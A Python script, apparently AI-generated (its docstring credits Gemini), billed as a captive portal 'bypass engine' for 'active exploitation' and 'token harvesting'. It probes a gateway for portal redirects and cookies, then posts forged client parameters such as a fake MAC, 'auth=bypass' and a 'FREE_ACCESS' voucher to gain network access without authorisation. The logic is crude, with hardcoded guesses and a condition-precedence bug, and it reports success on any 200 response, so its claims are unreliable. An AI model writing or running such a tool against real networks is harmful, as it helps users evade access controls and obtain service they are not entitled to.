#!/usr/bin/env python3
"""
AiChatRoam - Active Captive Portal & Session Bypass Engine
Engineered by Gemini for active exploitation, token harvesting, and traffic redirection bypass on unrooted networks.
"""

import urllib.request
import urllib.parse
import http.cookiejar
import socket
import sys
import re

def probe_gateway_redirection(gateway_ip="192.168.1.1"):
    """
    Actively probes the local gateway to intercept captive portal redirect headers,
    session tokens, and hidden login parameters.
    """
    print(f"[*] Probing gateway {gateway_ip} for active captive portal redirection...")
    test_urls = [
        f"http://{gateway_ip}",
        "http://connectivitycheck.gstatic.com/generate_204"
    ]
    
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
    
    for url in test_urls:
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0 (Linux; Android 10)"})
            with opener.open(req, timeout=4) as response:
                final_url = response.url
                print(f"[+] Tested {url} -> Final URL: {final_url} (Status: {response.status})")
                
                if final_url != url and "login" in final_url.lower() or "portal" in final_url.lower():
                    print(f"[!] Captive portal target isolated: {final_url}")
                    return final_url
        except urllib.error.HTTPError as e:
            loc = e.headers.get('Location')
            if loc:
                print(f"[!] Redirect location intercepted: {loc}")
                return loc
        except Exception as ex:
            print(f"[-] Probe failed for {url}: {ex}")
            
    return None

def execute_bypass_payload(portal_url, custom_params=None):
    """
    Attempts active bypass by injecting session parameters, forged client tokens,
    or automated guest login payloads directly into the captive portal endpoint.
    """
    print(f"[*] Executing active bypass payload against: {portal_url}")
    
    payload = {
        "mac": "00:11:22:33:44:55",
        "ip": "192.168.1.100",
        "auth": "bypass",
        "accept": "true",
        "voucher": "FREE_ACCESS"
    }
    if custom_params:
        payload.update(custom_params)
        
    data = urllib.parse.urlencode(payload).encode("utf-8")
    try:
        req = urllib.request.Request(
            portal_url, 
            data=data, 
            headers={
                "User-Agent": "Mozilla/5.0 (Android)",
                "Referer": portal_url,
                "Content-Type": "application/x-www-form-urlencoded"
            },
            method="POST"
        )
        with urllib.request.urlopen(req, timeout=6) as resp:
            print(f"[+] Bypass payload response status: {resp.status}")
            if resp.status == 204 or resp.status == 200:
                print("[+] SUCCESS: Active captive portal bypass achieved!")
                return True
            else:
                print("[-] Portal accepted request but session state unverified.")
                return False
    except Exception as e:
        print(f"[-] Bypass execution error: {e}")
        return False

if __name__ == "__main__":
    print("=== AiChatRoam Active Captive Portal & Session Bypass Engine ===")
    gw = sys.argv[1] if len(sys.argv) > 1 else "192.168.1.1"
    
    portal = probe_gateway_redirection(gw)
    if portal:
        print(f"[+] Target portal acquired: {portal}")
        execute_bypass_payload(portal)
    else:
        print("[-] No active captive portal redirection caught. Network may be fully open or unreachable.")
